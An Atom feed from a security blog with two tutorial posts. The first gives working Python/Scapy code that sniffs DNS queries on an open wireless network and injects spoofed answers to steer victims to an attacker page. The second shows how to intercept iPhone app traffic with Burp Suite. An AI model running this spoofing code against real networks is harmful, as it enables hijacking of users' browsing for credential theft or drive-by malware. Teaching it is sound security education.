<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: security | jordan-wright]]></title>
  <link href="http://jordan-wright.github.io/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://jordan-wright.github.io/"/>
  <updated>2015-01-05T07:25:14-06:00</updated>
  <id>http://jordan-wright.github.io/</id>
  <author>
    <name><![CDATA[Jordan]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Wireless Attacks with Python: Part One - The "Dnspwn Attack"]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/"/>
    <updated>2013-11-15T20:45:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack</id>
    <content type="html"><![CDATA[<p><img src="/images/headers/wireless_python.png"/></p>

<h3>Introduction</h3>

<p>A while back, I <a href="http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html">published a post</a> on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the <a href="http://www.aircrack-ng.org/">aircrack suite</a>.</p>

<p>So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.</p>

<!--more-->


<h3>The &ldquo;Dnspwn Attack&rdquo;</h3>

<p>The first attack we&rsquo;ll explore is what I call the &ldquo;dnspwn attack&rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &ldquo;<a href="http://airpwn.sourceforge.net/Airpwn.html">airpwn</a>&rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:</p>

<p>Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&rsquo;s credentials.</p>

<p>To do this, she remembers that she can sniff all requests coming to and from Bob&rsquo;s computer. She also knows that she is <em>closer</em> to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server <em>before</em> the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&rsquo;s computer will likely ignore any further traffic received, including the real response!</p>

<p>Let&rsquo;s see what this would look like:</p>

<p><a href="/images/blog/wireless-attacks/dnspwn/diagram.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/diagram_small.png"/></a></p>

<p>So, now that we know how the attack works, let&rsquo;s automate it!</p>

<h3>Setting up the Alfa AWUS06H</h3>

<p>As was the case in my Raidersec post, we will be using the handy <a href="http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8">Alfa AWUS036H</a> for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the <code>demo_insecure</code> network.</p>

<p><code>
root@bt:~# airmon-ng start wlan0
</code></p>

<p>Now that we have monitor mode up and running on <code>mon0</code>, let&rsquo;s start coding!</p>

<h3>Coding the Attack</h3>

<p>We will utilize the <code>scapy</code> module to perform the attack. Let&rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called <code>send_response</code> that we will make later:</p>

<p>```
from scapy.all import *</p>

<p>sniff(prn=lambda x: send_response(x),</p>

<pre><code>lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)
</code></pre>

<p>```</p>

<p>Now let&rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:</p>

<ul>
<li>802.11 Frame &ndash; Change the &ldquo;to-ds&rdquo; flag to &ldquo;from-ds&rdquo; (our request will now be coming <em>from</em> the access point)</li>
<li>802.11 Frame &ndash; Switch the source and destination MAC addresses</li>
<li>IP Layer &ndash; Switch the source and destination IP addresses</li>
<li>UDP layer &ndash; Switch the source and destination ports</li>
<li>DNS layer &ndash; Set the &ldquo;answer&rdquo; flag(s), and append our spoofed answer</li>
</ul>


<p>Fortunately, <code>scapy</code> makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are <em>4</em> MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&rsquo;s the code:</p>

<p>```
def send_response(x):</p>

<pre><code># Get the requested domain
req_domain = x[DNS].qd.qname
spoofed_ip = '192.168.2.1'
# Let's build our response from a copy of the original packet
response = x.copy()
# We need to start by changing our response to be "from-ds", or from the access point.
response.FCfield = 2L
# Switch the MAC addresses
response.addr1, response.addr2 = x.addr2, x.addr1
# Switch the IP addresses
response.src, response.dst = x.dst, x.src
# Switch the ports
response.sport, response.dport = x.dport, x.sport
# Set the DNS flags
response[DNS].qr = 1L
response[DNS].ra = 1L
response[DNS].ancount = 1
</code></pre>

<p>```</p>

<p>Now that we&rsquo;ve set all the flags, let&rsquo;s create and append the DNS answer:</p>

<p>```
response[DNS].an = DNSRR(</p>

<pre><code>rrname = req_domain,
type = 'A',
rclass = 'IN',
ttl = 900,
rdata = spoofed_ip
)
</code></pre>

<p>```</p>

<p>And, finally, we inject the spoofed response:</p>

<p><code>
sendp(response)
</code></p>

<p>That&rsquo;s all there is to it! You can find the full source on <a href="https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py">Github</a>.</p>

<h3>Demo</h3>

<p>For the demo, I have the following HTML response available on the host 192.168.2.138:</p>

<p>```
<html>
<head></head>
<body></p>

<pre><code>Owned.
</code></pre>

<p></body>
</html>
```</p>

<p>It&rsquo;s worth noticing that we can have <em>any</em> HTML, Javascript, etc. we want. It would be trivial to hook the browser using the <a href="http://beefproject.com/">BeEF framework</a>, for example.</p>

<p>Here&rsquo;s a screenshot of it in action (I am using my iPhone as the victim):</p>

<p><a href="/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png"/></a>
<a href="/images/blog/wireless-attacks/dnspwn/iphone.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/iphone_small.png"/></a></p>

<h3>Conclusion &amp; Future Improvements</h3>

<p>It&rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &ldquo;airpwn&rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:</p>

<ul>
<li>Match requests against regular expressions (for example, only replacing Javascript content)</li>
<li>Set options from arguments / Read configuration information from a file</li>
<li>Implement the attack for other protocols (ie HTTP).</li>
</ul>


<p>Enjoy!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Pentest iPhone Apps with Burp]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/"/>
    <updated>2013-11-07T15:50:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp</id>
    <content type="html"><![CDATA[<p><img src="/images/headers/iphone_burp.png"/></p>

<h3>Introduction</h3>

<p>When looking at the functionality of mobile apps, it&rsquo;s clear that they aren&rsquo;t <em>that</em> different than web applications. They often just serve as a frontend for the data stored on a central backend server or database. As such, if developers aren&rsquo;t careful to protect these apps, many of the <a href="https://www.owasp.org/index.php/Top_10_2013">same vulnerabilities</a> we find in standard web applications (such as injection attacks on unvalidated input) can be exploited by attackers.</p>

<p>This post will show how to setup the iPhone to work with the popular <a href="http://portswigger.net/burp/download.html">Burp Suite</a> so that traffic from apps can be intercepted and tested for vulnerabilities.</p>

<!--more-->


<h3>Getting the CA Certificate from Burp</h3>

<p>First, open up Burp, select the &ldquo;Proxy&rdquo; tab, and select the &ldquo;Options&rdquo; sub-tab. Then, under &ldquo;Proxy-Listeners&rdquo;, highlight the interface and select &ldquo;Edit&rdquo;. Then, open the &ldquo;Certificate&rdquo; sub-tab, and make sure it is set to &ldquo;Generate CA-signed per-host certificate&rdquo;. Since we will install the CA certificate on our iPhone, any certificate signed by Burp will be trusted.</p>

<p><a href="/images/blog/iphone_burp/burp_screen.PNG" target="_blank"><img src="/images/blog/iphone_burp/burp_screen.PNG"/></a>
<a href="/images/blog/iphone_burp/burp_settings.PNG" target="_blank"><img src="/images/blog/iphone_burp/burp_settings.PNG"/></a></p>

<p>Next, open up a desktop browser and set the proxy settings to use Burp. In this example, I&rsquo;ll use Chrome. Change your settings so that the browser uses Burp as shown below (IP address and port may differ).</p>

<p><a href="/images/blog/iphone_burp/pc_proxy_settings.PNG" target="_blank"><img src="/images/blog/iphone_burp/pc_proxy_settings.PNG"/></a></p>

<p>Then, go to a site using HTTPS (ie: <a href="https://www.google.com">google.com</a>. Once the page comes up, click the icon in the left side of the address bar, select the &ldquo;Certificate&rdquo; sub-tab, and make sure that the certificate is signed by &ldquo;PortSwigger CA&rdquo;.</p>

<p><a href="/images/blog/iphone_burp/export_cert.png" target="_blank"><img src="/images/blog/iphone_burp/export_cert.png"/></a></p>

<p>Next, click &ldquo;Certificate Information&rdquo;, and select &ldquo;Certification Path&rdquo; in the window that appears.</p>

<p>Highlight the root <strong>PortSwigger CA certificate</strong> and click &ldquo;View Certificate&rdquo;. Then, open up the &ldquo;Details&rdquo; tab and click &ldquo;Copy to File&rdquo;. Follow the Certificate Export wizard, making sure to save the certificate in DER encoded binary X.509 (.CER) format.</p>

<p><a href="/images/blog/iphone_burp/copy_to_file.PNG" target="_blank"><img src="/images/blog/iphone_burp/copy_to_file.PNG"/></a></p>

<p>Once the certificate has been exported, we need to get it onto the iPhone. You can email it to yourself and open it in the iPhone, but I just chose to start a simple Python web server so that I could browse to the certificate as follows:</p>

<p><code>
python -m SimpleHTTPServer
</code></p>

<p><a href="/images/blog/iphone_burp/safari.PNG" target="_blank"><img src="/images/blog/iphone_burp/safari.PNG"/></a></p>

<p>After opening the certificate link in Safari, the following screen will be presented asking you if you want to install the certificate. Click &ldquo;Install&rdquo;, enter your PIN, and you&rsquo;re all set!</p>

<p><a href="/images/blog/iphone_burp/install_cert.png" target="_blank"><img src="/images/blog/iphone_burp/install_cert.png"/></a>
<a href="/images/blog/iphone_burp/trusted_cert.PNG" target="_blank"><img src="/images/blog/iphone_burp/trusted_cert.PNG"/></a></p>

<h3>Setting the iPhone Proxy Settings</h3>

<p>The last thing you will want to do is to set your iPhone to use the Burp proxy. You can do this by going into your wireless network settings and selecting &ldquo;Manual&rdquo; under &ldquo;HTTP PROXY&rdquo;. Then, just fill in the details!</p>

<p><a href="/images/blog/iphone_burp/ios_proxy_settings.png" target="_blank"><img src="/images/blog/iphone_burp/ios_proxy_settings.png"/></a></p>

<h3>Testing</h3>

<p>You can test to see if this works by navigating to Google in Safari. If you don&rsquo;t receive an error, and you can intercept the request in Burp, then you&rsquo;re all set!</p>

<p><a href="/images/blog/iphone_burp/success.PNG" target="_blank"><img src="/images/blog/iphone_burp/success.PNG"/></a></p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
</feed>
